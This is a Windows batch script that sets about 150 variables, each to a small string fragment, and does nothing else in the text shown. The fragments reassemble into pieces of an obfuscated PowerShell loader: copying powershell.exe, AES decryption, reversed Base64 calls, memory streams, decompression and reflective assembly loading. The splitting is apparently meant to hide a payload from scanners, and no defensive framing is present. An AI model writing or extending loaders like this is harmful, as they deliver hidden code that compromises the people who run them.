@echo off
set "TzTSxXQyzU=we"
set "SmLQZJxIBo=we"
set "HuEBPhzwZa=em"
set "QhHzZkQBqY=ll"
set "aihkRGSeJE= C"
set "veTxdslMRz=ll"
set "QSqjZefOaW=1."
set "rOkIVYaIZF=he"
set "LZcGJHKTwq=Sy"
set "cnNlpTVTbc=Wi"
set "sTsDlfplWy=xe"
set "RHegcljrzl=\v"
set "mNpdJMvVUY=s\"
set "TvWlNnrzCx=.e"
set "XizTzZjdpM= /"
set "BpYixWRZUI=y "
set "IKyoqruBQC=in"
set "UOLToJGnvL=py"
set "hoUvwSeSAS=do"
set "vlCkFOxSYr=:\"
set "UOAINpwgze=nd"
set "xDrrLeVSHk=co"
set "wCrqHppGuT=ws"
set "lRjcOJmBoz=ow"
set "RBUgbgsiGb=rS"
set "bNgXPdRtdn=he"
set "SeEoxKTvgR=0\"
set "YseYgWtvYy=\W"
set "ecAtfMcPIr=rs"
set "pRSIjuJaVD=po"
set "NexBsjbXkb=Po"
set "sqtTfkeKxG=st"
set "TAlBtmOCsh=32"
set "ICBfIYvPAk=cd"
set "vRgtCoCtoy= %~dp0"
set "ZKoHWVUIYg=pnMI"
set "QIqiPobXfs=[Sys"
set "TgwLqUFpqk=sGUc"
set "mfVaclIDNj=pDZz"
set "hsfULoSpqS=ment"
set "tMfXywlevZ=em.I"
set "ahEJCksayF=();$"
set "SUrNJlmVPJ= if "
set "CrBbeEzDAM=y.Ci"
set "IafeDZTWqb=();$"
set "OtHMwwOBTO=I = "
set "QQmnjnBeOQ=, (,"
set "FhmYQEhzaY=ress"
set "jfFBxVLZoO=.Cop"
set "nHHoxEgUMy=.Mem"
set "oisrQJQIEm=hy.A"
set "VpigmQVCUP=fore"
set "ookslORaIF=$yQX"
set "VQFDaqFxxr=oryS"
set "gBXLzSiRjm=cVuN"
set "MDHQajqbvZ=comp"
set "xMFphoDOLx=bstr"
set "xylmVlyIEQ=;$yg"
set "udKeJzbBUB=grap"
set "HUSzqSNztN=3HWs"
set "tCsehjOdgt=bKJW"
set "kuVNAwkCPi=F'[-"
set "dnPaQxjctT=ionM"
set "tbTojTaqxW=v4Ir"
set "iynJBmqULi=1..-"
set "uzRWplmieU=c = "
set "FSfOSnckXH=('da"
set "GHAGxrhWVO= '')"
set "DhkxDlKMJA= [Sy"
set "ykigDmatBC=I, 0"
set "dJjFNBBohG=gnir"
set "iYnsNdCgiz=y.Cr"
set "fRKZyXMdSg=)($y"
set "pnfHgAUrRL=ptor"
set "mnQbwhUxnm=onve"
set "bVtMYkHSkM=16] "
set "jkoKfVYiUV== $g"
set "FPrvgyazIo=bjec"
set "YfkJlczXFF=($bK"
set "PstbmQBNpP=;$Ac"
set "sJlajSbHxj=DDvz"
set "HeqEVRNNBZ=k = "
set "NRDxxkNQYb=[IO."
set "JtnMdGvOUn=Fina"
set "jYyuheUADy=$bhM"
set "GyDAjBlaxr=esaB"
set "SdiJJSfLcK=nirt"
set "byTweDYFAP=Obje"
set "wHXPLCzWpI=Fo7l"
set "mZNqRCfRXV=rt]:"
set "QIrAUOqLyJ=yste"
set "TaGIfcliZF= = N"
set "lMDpfqAyjJ=$sOk"
set "vWVRSlXnhG=raph"
set "aByStHzSmf=oArr"
set "rdLjitHmYd=[]] "
set "oWYwUZZTMC=..-1"
set "XmDmkEbTbl=.Cry"
set "aUmPdjPJGi=y]::"
set "YPyuDQfyUk=bhMR"
set "vZzForUpIR=vf.T"
set "RuyPBdMHEg=gDDv"
set "CtaQMRDkXF=Disp"
set "pRgsZtNnlM=ecry"
set "VCcXUOfNwd=th('"
set "QJfpmAgbBC=ode]"
set "WFyYhucBmb='[-1"
set "qFlFhFkOae=RZ ="
set "gIYByGCJNI=JWH "
set "CNpcffdDYt=m(, "
set "fAWKJoZanp=;$nF"
set "xbgCrensED=tem."
set "UaPrQOEzZR=[Env"
set "GUujFZvQGG=I = "
set "cblGkRjFTW=d;$g"
set "PtAFiFKIoy=yQXQ"
set "yyETxXVkfi=Mode"
set "TsigYXonBQ=UGTu"
set "RVuwuiQeHZ=orF'"
set "IgzsZhTdJZ=QXQI"
set "BOhuLBIJqf=tS46"
set "KlfhALKUQJ=Secu"
set "nqCpuxQymF=vj0m"
set "JpysPVqqGl=z.Pa"
set "vJpancPaXB=:: '"
set "ufMBHOWzOt=.Cry"
set "MgYbSTMyMP=Conv"
set "fcsaBbqMtZ=gMod"
set "xTLXiVhnHL=n ''"
set "tgdBmIpzSw=]::("
set "doZcEHaBbx=Bmor"
set "gUtqSMdOpO=embl"
set "LUazdAOhOQ=mory"
